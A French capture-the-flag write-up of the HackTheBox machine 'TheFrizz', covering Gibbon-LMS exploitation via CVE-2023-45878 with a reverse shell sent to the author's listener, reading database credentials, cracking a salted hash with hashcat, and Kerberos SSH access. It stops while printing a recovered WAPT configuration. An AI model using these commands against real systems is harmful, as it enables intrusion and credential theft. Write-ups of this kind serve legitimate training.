---
title: TheFrizz
date: 2025-12-11 10:28:41
categories: ["Machines", "Hackthebox"]
tags: ["Medium", "Windows", "Active Directory", "CVE-2023-45878", "SharpGPOAbuse", "MySQL", "SSH"]
---

![TheFrizz](/images/TheFrizz/thefrizz.png)

`TheFrizz` est une machine Windows de difficulté moyenne mettant en scène une application web représentant l’école élémentaire Walkerville et une instance de `Gibbon CMS`. Cette instance est vulnérable à une écriture arbitraire de fichiers non authentifiée (`CVE-2023-45878`), permettant d’uploader un shell PHP pour obtenir un accès initial.
Une fois sur le système, un fichier de configuration de base de données révèle des identifiants MySQL, incluant un hash et un sel pour l’utilisateur `f.frizzle`. Après cassage du mot de passe, une authentification SSH avec `GSSAPI/Kerberos` est possible. En obtenant un TGT (Ticket Granting Ticket), on utilise l’authentification Kerberos pour progresser.
Dans la corbeille de l’utilisateur `f.frizzle`, un archive `7Zip` supprimée est découverte. Son extraction révèle une configuration `WAPT` contenant des identifiants encodés en base64 pour le compte `M.Schoolbus`. Ce dernier, membre du groupe `Group Policy Creator Owners`, permet de créer des GPOs pour élever les privilèges jusqu’à `NT Authority\System`.

## Enumération
### Nmap

Il y a plusieurs ports ouverts : `SSH`, `DNS`, `HTTP`, `Kerberos`, `RPC`, `LDAP`, `SMB`, `LDAPS`.
```shell
╭─root at exegol-hackthebox in /workspace/TheFrizz
╰─○ nmap 10.129.187.99 --min-rate 10000 -vv -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-15 15:42 CEST
<snip>
Completed SYN Stealth Scan at 15:43, 43.34s elapsed (65535 total ports)
Nmap scan report for 10.129.187.99
Host is up, received echo-reply ttl 127 (4.1s latency).
Scanned at 2025-07-15 15:42:42 CEST for 43s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
62152/tcp open  unknown          syn-ack ttl 127

╭─root at exegol-hackthebox in /workspace/TheFrizz
╰─○ nmap 10.129.187.99 -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,49673,62152 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-15 15:49 CEST
Nmap scan report for 10.129.187.99
Host is up (0.034s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 20:49:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
62152/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time:
|   date: 2025-07-15T20:50:08
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```


J'ajoute le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```shell
echo "10.129.187.99 frizzdc.frizz.htb frizzdc frizz.htb" | tee -a /etc/hosts
```


### HTTP - TCP 80

J'arrive sur un site d’éducation.
![](/images/TheFrizz/TheFrizz-1.png)


En cliquant sur le bouton `login`, je vois que je suis sur un site **`Gibbon-LMS`**.
![](/images/TheFrizz/TheFrizz-2.png)


## Reverse shell en tant que w.webservice
### CVE-2023-45878

Sur [cve-details](https://www.cvedetails.com/cve/CVE-2023-45878/), je vois que cette version de `GIBBON-LMS` est vulnerable à une **écriture arbitraire de fichiers** conduisant à une **exécution de code à distance (RCE) non authentifiée**. Le fichier **`rubrics_visualise_saveAjax.php`** ne vérifie pas l'authentification des utilisateurs.
L'exploitation est la suivante :
- Un attaquant peut envoyer une requête HTTP malveillante avec :
    - Un **`img`** contenant du code PHP malveillant encodé en `base64`.
    - Un **`path`** pointant vers un emplacement accessible sur le serveur.
- Le serveur décode le contenu de **`img`** et l'écrit dans le fichier spécifié par **`path`**.
- Résultat : création d'un fichier PHP arbitraire sur le serveur, permettant une **exécution de code à distance (RCE)** sans authentification.
Je trouve alors un [POC](https://github.com/dgoorden/CVE-2023-45878) permettant d'automatiser cela. Ce qui me permet d'avoir un shell en tant que **`w.webservice`**.
```python
python3 CVE-2023-45878.py -u http://frizzdc.frizz.htb/Gibbon-LMS -l 10.10.16.53 -p 9001 -f pwn
```
![](/images/TheFrizz/TheFrizz-3.png)


## Shell en tant que f.frizzle
### MySQL

Je trouve les identifiants de la base de données `MrGibbonsDB:MisterGibbs!Parrot!?1`.
```powershell
SHELL> pwd

Path
----
C:\xampp\htdocs\Gibbon-LMS

SHELL> type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
```


Je trouve les bases de données.
```
SHELL> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
Database
gibbon
information_schema
test
```


J’énumère les tables de la base de données Gibbon.
```powershell
SHELL> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; show tables;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
gibbonapplicationformfile
gibbonapplicationformlink
gibbonapplicationformrelationship
gibbonattendancecode
gibbonattendancelogcourseclass
gibbonattendancelogformgroup
gibbonattendancelogperson
gibbonbehaviour
gibbonbehaviourletter
gibboncountry
gibboncourse
gibboncourseclass
gibboncourseclassmap
gibboncourseclassperson
gibboncrowdassessdiscuss
gibboncustomfield
gibbondataretention
gibbondaysofweek
gibbondepartment
gibbondepartmentresource
gibbondepartmentstaff
gibbondiscussion
gibbondistrict
gibbonemailtemplate
gibbonexternalassessment
gibbonexternalassessmentfield
gibbonexternalassessmentstudent
gibbonexternalassessmentstudententry
gibbonfamily
gibbonfamilyadult
gibbonfamilychild
gibbonfamilyrelationship
gibbonfamilyupdate
gibbonfileextension
gibbonfinancebillingschedule
gibbonfinancebudget
gibbonfinancebudgetcycle
gibbonfinancebudgetcycleallocation
gibbonfinancebudgetperson
gibbonfinanceexpense
gibbonfinanceexpenseapprover
gibbonfinanceexpenselog
gibbonfinancefee
gibbonfinancefeecategory
gibbonfinanceinvoice
gibbonfinanceinvoicee
gibbonfinanceinvoiceeupdate
gibbonfinanceinvoicefee
gibbonfirstaid
gibbonfirstaidfollowup
gibbonform
gibbonformfield
gibbonformgroup
gibbonformpage
gibbonformsubmission
gibbonformupload
gibbongroup
gibbongroupperson
gibbonhook
gibbonhouse
gibboni18n
gibbonin
gibboninarchive
gibboninassistant
gibbonindescriptor
gibbonininvestigation
gibbonininvestigationcontribution
gibboninpersondescriptor
gibboninternalassessmentcolumn
gibboninternalassessmententry
gibbonlanguage
gibbonlibraryitem
gibbonlibraryitemevent
gibbonlibrarytype
gibbonlog
gibbonmarkbookcolumn
gibbonmarkbookentry
gibbonmarkbooktarget
gibbonmarkbookweight
gibbonmedicalcondition
gibbonmessenger
gibbonmessengercannedresponse
gibbonmessengerreceipt
gibbonmessengertarget
gibbonmigration
gibbonmodule
gibbonnotification
gibbonnotificationevent
gibbonnotificationlistener
gibbonoutcome
gibbonpayment
gibbonpermission
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
gibbonpersonupdate
gibbonplannerentry
gibbonplannerentrydiscuss
gibbonplannerentryguest
gibbonplannerentryhomework
gibbonplannerentryoutcome
gibbonplannerentrystudenthomework
gibbonplannerentrystudenttracker
gibbonplannerparentweeklyemailsummary
gibbonreport
gibbonreportarchive
gibbonreportarchiveentry
gibbonreportingaccess
gibbonreportingcriteria
gibbonreportingcriteriatype
gibbonreportingcycle
gibbonreportingprogress
gibbonreportingproof
gibbonreportingscope
gibbonreportingvalue
gibbonreportprototypesection
gibbonreporttemplate
gibbonreporttemplatefont
gibbonreporttemplatesection
gibbonresource
gibbonresourcetag
gibbonrole
gibbonrubric
gibbonrubriccell
gibbonrubriccolumn
gibbonrubricentry
gibbonrubricrow
gibbonscale
gibbonscalegrade
gibbonschoolyear
gibbonschoolyearspecialday
gibbonschoolyearterm
gibbonsession
gibbonsetting
gibbonspace
gibbonspaceperson
gibbonstaff
gibbonstaffabsence
gibbonstaffabsencedate
gibbonstaffabsencetype
gibbonstaffapplicationform
gibbonstaffapplicationformfile
gibbonstaffcontract
gibbonstaffcoverage
gibbonstaffcoveragedate
gibbonstaffduty
gibbonstaffdutyperson
gibbonstaffjobopening
gibbonstaffupdate
gibbonstring
gibbonstudentenrolment
gibbonstudentnote
gibbonstudentnotecategory
gibbonsubstitute
gibbontheme
gibbontt
gibbonttcolumn
gibbonttcolumnrow
gibbonttday
gibbonttdaydate
gibbonttdayrowclass
gibbonttdayrowclassexception
gibbonttimport
gibbonttspacebooking
gibbonttspacechange
gibbonunit
gibbonunitblock
gibbonunitclass
gibbonunitclassblock
gibbonunitoutcome
gibbonusernameformat
gibbonyeargroup
```


Les utilisateurs se trouvent dans la table **`gibbonperson`**.
```powershell
SHELL> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; describe gibbonperson;"
Field   Type    Null    Key     Default Extra
gibbonPersonID  int(10) unsigned zerofill       NO      PRI     NULL    auto_increment
title   varchar(5)      NO              NULL
surname varchar(60)     NO
firstName       varchar(60)     NO
preferredName   varchar(60)     NO
officialName    varchar(150)    NO              NULL
nameInCharacters        varchar(60)     NO              NULL
gender  enum('M','F','Other','Unspecified')     NO              Unspecified
username        varchar(20)     NO      UNI     NULL
passwordStrong  varchar(255)    NO              NULL
passwordStrongSalt      varchar(255)    NO              NULL
passwordForceReset      enum('N','Y')   NO              N
status  enum('Full','Expected','Left','Pending Approval')       NO              Full
canLogin        enum('Y','N')   NO              Y
gibbonRoleIDPrimary     int(3) unsigned zerofill        NO              NULL
gibbonRoleIDAll varchar(255)    NO              NULL
dob     date    YES             NULL
email   varchar(75)     YES             NULL
emailAlternate  varchar(75)     YES             NULL
image_240       varchar(255)    YES             NULL
lastIPAddress   varchar(15)     NO
lastTimestamp   timestamp       YES             NULL
lastFailIPAddress       varchar(15)     YES             NULL
lastFailTimestamp       timestamp       YES             NULL
failCount       int(1)  YES             0
address1        mediumtext      NO              NULL
address1District        varchar(255)    NO              NULL
address1Country varchar(255)    NO              NULL
address2        mediumtext      NO              NULL
address2District        varchar(255)    NO              NULL
address2Country varchar(255)    NO              NULL
phone1Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone1CountryCode       varchar(7)      NO              NULL
phone1  varchar(20)     NO              NULL
phone3Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone3CountryCode       varchar(7)      NO              NULL
phone3  varchar(20)     NO              NULL
phone2Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone2CountryCode       varchar(7)      NO              NULL
phone2  varchar(20)     NO              NULL
phone4Type      enum('','Mobile','Home','Work','Fax','Pager','Other')   NO
phone4CountryCode       varchar(7)      NO              NULL
phone4  varchar(20)     NO              NULL
website varchar(255)    NO              NULL
languageFirst   varchar(30)     NO              NULL
languageSecond  varchar(30)     NO              NULL
languageThird   varchar(30)     NO              NULL
countryOfBirth  varchar(30)     NO              NULL
birthCertificateScan    varchar(255)    NO              NULL
ethnicity       varchar(255)    NO              NULL
religion        varchar(30)     NO              NULL
profession      varchar(90)     NO              NULL
employer        varchar(90)     NO              NULL
jobTitle        varchar(90)     NO              NULL
emergency1Name  varchar(90)     NO              NULL
emergency1Number1       varchar(30)     NO              NULL
emergency1Number2       varchar(30)     NO              NULL
emergency1Relationship  varchar(30)     NO              NULL
emergency2Name  varchar(90)     NO              NULL
emergency2Number1       varchar(30)     NO              NULL
emergency2Number2       varchar(30)     NO              NULL
emergency2Relationship  varchar(30)     NO              NULL
gibbonHouseID   int(3) unsigned zerofill        YES             NULL
studentID       varchar(15)     NO              NULL
dateStart       date    YES             NULL
dateEnd date    YES             NULL
gibbonSchoolYearIDClassOf       int(3) unsigned zerofill        YES             NULL
lastSchool      varchar(100)    NO              NULL
nextSchool      varchar(100)    NO              NULL
departureReason varchar(50)     NO              NULL
transport       varchar(255)    NO              NULL
transportNotes  text    NO              NULL
calendarFeedPersonal    text    NO              NULL
viewCalendarSchool      enum('Y','N')   NO              Y
viewCalendarPersonal    enum('Y','N')   NO              Y
viewCalendarSpaceBooking        enum('Y','N')   NO              N
gibbonApplicationFormID int(12) unsigned zerofill       YES             NULL
lockerNumber    varchar(20)     NO              NULL
vehicleRegistration     varchar(20)     NO              NULL
personalBackground      varchar(255)    NO              NULL
messengerLastRead       datetime        YES             NULL
privacy text    YES             NULL
dayType varchar(255)    YES             NULL
gibbonThemeIDPersonal   int(4) unsigned zerofill        YES             NULL
gibboni18nIDPersonal    int(4) unsigned zerofill        YES             NULL
studentAgreements       text    YES             NULL
googleAPIRefreshToken   text    NO              NULL
microsoftAPIRefreshToken        text    NO              NULL
genericAPIRefreshToken  text    NO              NULL
receiveNotificationEmails       enum('Y','N')   NO              Y
mfaSecret       varchar(16)     YES             NULL
mfaToken        text    YES             NULL
cookieConsent   enum('Y','N')   YES             NULL
fields  text    NO              NULL
```


Je récupère alors le hash ainsi que le `salt` de l'utilisateur `f.frizzle`.
```powershell
SHELL> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; select username,passwordStrong,passwordStrongSalt,passwordForceReset from  gibbonperson;"
username        passwordStrong  passwordStrongSalt      passwordForceReset
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489  N
```


### Hashcat

Dans la documentation de [Gibbon](https://github.com/GibbonEdu/core/blob/v30.0.00/preferencesPasswordProcess.php), je vois que le mot de passe est le `salt+passwordStrong`.
![](/images/TheFrizz/TheFrizz-6.png)


Je mets alors le hash et le salt dans un fichier sous le format **`hash:salt`** et je le craque avec le mode **`1420`** de `hashcat`.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ hashcat -m 1420 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
<snip>
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1420 (sha256($salt.$pass))
Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
Time.Started.....: Mon Aug 25 16:25:43 2025 (1 sec)
Time.Estimated...: Mon Aug 25 16:25:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9975.2 kH/s (0.59ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11026432/14344384 (76.87%)
Rejected.........: 0/11026432 (0.00%)
Restore.Point....: 11010048/14344384 (76.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Joyster -> James&Ciara
Hardware.Mon.#1..: Temp: 89c Util: 41%

Started: Mon Aug 25 16:25:29 2025
Stopped: Mon Aug 25 16:25:45 2025
```


Les identifiants `f.frizzle:Jenni_Luvs_Magic23` sont valides. Je vois aussi que l'authentification `NTLM` est désactivée.
```shell
╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
╰─➤  nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
SMB         10.129.232.168  445    10.129.232.168   [*]  x64 (name:10.129.232.168) (domain:10.129.232.168) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.232.168  445    10.129.232.168   [-] 10.129.232.168\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED

╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
╰─➤  faketime "$(rdate -n frizzdc.frizz.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
╰─➤  nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```


Je génère alors un fichier `/etc/krb5.conf`
```shell
╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
╰─➤  nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```


### BloodHound

Je génère un `TGT` en pour `f.frizzle` et je lance `bloodhound`.
```shell
╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
╰─➤  getTGT.py 'frizz.htb/f.frizzle:Jenni_Luvs_Magic23'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in f.frizzle.ccache
╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main*›
╰─➤  export KRB5CCNAME=f.frizzle.ccache

╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main*›
╰─➤  nxc ldap frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -k --bloodhound -c All --dns-server 10.129.232.168
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [*] None (name:FRIZZDC) (domain:frizz.htb)
LDAP        frizzdc.frizz.htb 389    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Resolved collection methods: session, container, psremote, objectprops, localadmin, rdp, acl, trusts, dcom, group
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Using kerberos auth without ccache, getting TGT
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Done in 00M 14S
LDAP        frizzdc.frizz.htb 389    FRIZZDC          Compressing output into /root/.nxc/logs/FRIZZDC_frizzdc.frizz.htb_2025-08-05_065417_bloodhound.zip
```


Je vois que `f.frizzle` est membre du groupe `Remote Management Users`. A part ça, il ne présente rien d’intéressant.
![](/images/TheFrizz/TheFrizz-5.png)


### SSH

Il faut s'assurer d'avoir cette configuration dans le fichier `/etc/hosts`. Car lorsqu'il essayera de faire la résolution DNS, il doit trouver en premier soit le FQDN complet soit juste le nom de la machine.
```shell
10.129.187.99 frizzdc.frizz.htb frizzdc frizz.htb
```


Je me connecte alors par SSH avec l'option **`-K`**.
```shell
ssh -K f.frizzle@frizzdc.frizz.htb
```
![](/images/TheFrizz/TheFrizz-7.png)


![](https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp)


## Shell en tant que M.Schoolbus
### Corbeille

A la racine, je vois en énumérant les fichiers cachée, le répertoire de la Corbeille. J'y trouve un dossier appartenant à l'utilisateur `f.frizzle` dans lequel se trouve deux fichiers. Le premier `$IE2XMEG.7z` contient les métadonnées du fichier original et le second `$RE2XMEG.7z` est le fichier.
```powershell
PS C:\Users\f.frizzle> cd /
PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:35 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp

PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:36 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:35 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           8/25/2025  5:28 AM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp

PS C:\> cd '$RECYCLE.BIN'
PS C:\$RECYCLE.BIN> ls -force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

PS C:\$RECYCLE.BIN> cd S-1-5-21-2386970044-1145388522-2932701813-1103
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls -force

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
-a-hs          10/29/2024  7:31 AM            129 desktop.ini

```


J'arrive à télécharger le fichier avec **`scp`**. Mais j'ai une erreur lorsque j'essais de le décompresser.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' RE2XMEG.7z
$RE2XMEG.7z                                                                                         100%   29MB  10.8MB/s   00:02

[root@exegol-htb] /workspace/TheFrizz
❯ 7z x RE2XMEG.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 5825U with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 204800 bytes (200 KiB)

Extracting archive: RE2XMEG.7z
ERROR: RE2XMEG.7z
RE2XMEG.7z
Open ERROR: Can not open the file as [7z] archive


ERRORS:
Unexpected end of archive

Can't open as archive: 1
Files: 0
Size:       0
Compressed: 0
```


Donc je vais télécharger le fichier d'une autre façon. Je copie le fichier `$RE2XMEG.7z` dans le répertoire `C:/programdata`.
```powershell
copy-item '$RE2XMEG.7z' -Destination 'C:/programdata/$RE2XMEG.7z'
```
![](/images/TheFrizz/TheFrizz-9.png)


Ensuite depuis mon reverse shell en tant que `w.werbservice`, je copie le fichier dans le répertoire `C:\xampp\htdocs\`
```powershell
copy-item 'C:/programdata/$RE2XMEG.7z' -Destination 'C:\xampp\htdocs\$RE2XMEG.7z'
```
![](/images/TheFrizz/TheFrizz-10.png)


Puis je télécharge le fichier sur le site web.
![](/images/TheFrizz/TheFrizz-8.png)


Je le décompresse ensuite.
```shell
[root@exegol-htb] /workspace/TheFrizz/CVE-2023-45878 (main) ⚡
❯ 7z x '$RE2XMEG.7z'

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 5825U with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 30416987 bytes (30 MiB)

Extracting archive: $RE2XMEG.7z
--
Path = $RE2XMEG.7z
Type = 7z
Physical Size = 30416987
Headers Size = 65880
Method = 0A LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 3

ERROR: Unsupported Method : wapt/lib/site-packages/setuptools/cli-arm64.exe
ERROR: Unsupported Method : wapt/lib/site-packages/setuptools/gui-arm64.exe

Sub items Errors: 2

Archives with Errors: 1

Sub items Errors: 2
```


S'y trouve un dossier pour **WAPT Server**, une solution logicielle pour le déploiement, la gestion et la maintenance des parcs informatiques en entreprise.
```shell
[root@exegol-htb] /workspace/TheFrizz
❯ cd wapt                                                                                                                           ⏎

[root@exegol-htb] /workspace/TheFrizz/wapt
❯ ls
auth_module_ad.py  languages              setuphelpers_macos.py    waptconsole.exe.manifest  waptmessage.exe       wapttftpserver
cache              lib                    setuphelpers.py          waptcrypto.py             waptpackage.py        wapttftpserver.exe
common.py          licencing.py           setuphelpers_unix.py     wapt-enterprise.ico       wapt.psproj           wapttray.exe
conf               log                    setuphelpers_windows.py  wapt-get.exe              waptpython.exe        waptutils.py
conf.d             private                ssl                      wapt-get.exe.manifest     waptpythonw.exe       waptwua
COPYING.txt        __pycache__            templates                wapt-get.ini              wapt-scanpackages.py  wgetwads32.exe
db                 revision.txt           trusted_external_certs   wapt-get.ini.tmpl         waptself.exe          wgetwads64.exe
DLLs               Scripts                unins000.msg             wapt-get.py               waptserver.exe
keyfinder.py       setupdevhelpers.py     version-full             waptguihelper.pyd         waptservice.exe
keys               setuphelpers_linux.py  waptbinaries.sha256      waptlicences.pyd          wapt-signpackages.py

```


Dans le répertoire **`wapt/conf`** se trouve le fichier de configuration de WAPT Server (**`waptserver.ini`**). On y trouve le mot de passe chiffré en `base64` que je déchiffre.
```shell
[root@exegol-htb] /workspace/TheFrizz/wapt
❯ cd conf

[root@exegol-htb] /workspace/TheFrizz/wapt/conf
❯ ls
ca-192.168.120.158.crt  forward_ssl_auth.conf  uwsgi_params    waptserver.ini.template
ca-192.168.120.158.pem  require_ssl_auth.conf  waptserver.ini

[root@exegol-htb] /workspace/TheFrizz/wapt/conf
❯ ls
ca-192.168.120.158.crt  forward_ssl_auth.conf  uwsgi_params    waptserver.ini.template
ca-192.168.120.158.pem  require_ssl_auth.conf  waptserver.ini

[root@exegol-htb] /workspace/TheFrizz/wapt/conf
❯ cat waptserver.ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
